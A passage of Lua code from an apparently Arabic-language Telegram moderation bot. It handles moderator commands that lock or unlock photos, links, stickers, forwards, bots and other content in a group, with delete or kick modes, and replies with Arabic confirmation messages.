elseif text == 'قفل السيلفي' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lock:self'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lockked:self'..msg.chat_id_,true)   tahadevstorm:del(DEVSTOR..'lockkick:self'..msg.chat_id_,true)   tahadevstorm:del(DEVSTOR..'lockktm:self'..msg.chat_id_,true)   taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* بصمه الفيديو \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') 
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and is_mod(msg) then taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل جميع الاوامر *\n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  add_lockal(msg.chat_id_) end
if text == 'فتح الصور' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:photo'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصور \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الروابط' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lock:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــروابط \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'فتح الشارحه' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــشارحه \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المعرفات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمعرفات \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التاك' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتاك \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الصوت' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lock:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصوت \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:text'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:text'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:text'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:text'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح الدردشه هنا* \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الفيديو' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــفيديو \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح المتحركه' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــمتحركه \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملصقات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملصقات \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الالعاب' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الالـعاب \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الاغاني' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الاغـاني \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح اللستات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* اللستـات \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  taha = '*◗??¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح دخول الاعضاء* \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التوجيه' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــتوجيه \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الكلايش' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــكلايش \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الملفات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــملفات \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:edit'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح تعديل الرسائل* \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الماركداون' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الماركداون \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:tagservr'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح الاشعارت *\n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح الجهات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــجهات \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:bots:kick'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lockked:bots'..msg.chat_id_,true)   tahadevstorm:del(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح اضافه البوتات* \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR.."lockpin"..msg.chat_id_, true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح تثبيت الرسائل*\n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
elseif text == 'فتح السيلفي' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:del(DEVSTOR..'lock:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* بصمه الفيديو \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') 
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم فـتح جميع الاوامر* \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')    rem_lockal(msg.chat_id_) end    
if text == 'قفل الصور بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:photo'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصور  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الروابط بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:links'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:links'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــروابط  \n*◗📛¦ خـاصيــه ، الــطرد 🚷*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الشارحه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــشارحه  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المعرفات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:user'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:user'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمعرفات  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التاك بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:hash'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتاك  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الصوت بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:muse'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:musw'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصوت  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الفيديو بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ved'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــفيديو  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل المتحركه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:gif'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمتحركه  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملصقات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:ste'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملصقات  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الالعاب بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:geam'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الالـعاب  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الاغاني بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الاغـاني  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل اللستات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* اللستـات  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الدخول بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:addm'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)   taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم قفـل دخول الاعضاء*  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التوجيه بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتوجيه  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الكلايش بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــكلايش  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملفات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملفات  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الماركداون بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الماركداون  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الجهات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــجهات  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:bots:kick'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:bots'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل اضافه البوتات  *\n*◗📛¦ خاصيه ، طرد البوت و العضو 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل السيلفي بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lockkick:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lock:self'..chat_id,true)  tahadevstorm:del(DEVSTOR..'lockked:self'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:self'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* بصمه الفيديو  \n*◗📛¦ خـاصيــه ، الــطرد 🚯*'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md') end
if text == 'فتح الصور بالطرد' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:del(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم فتـح ارسال* الــصور بالطرد \n✘'  storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')   
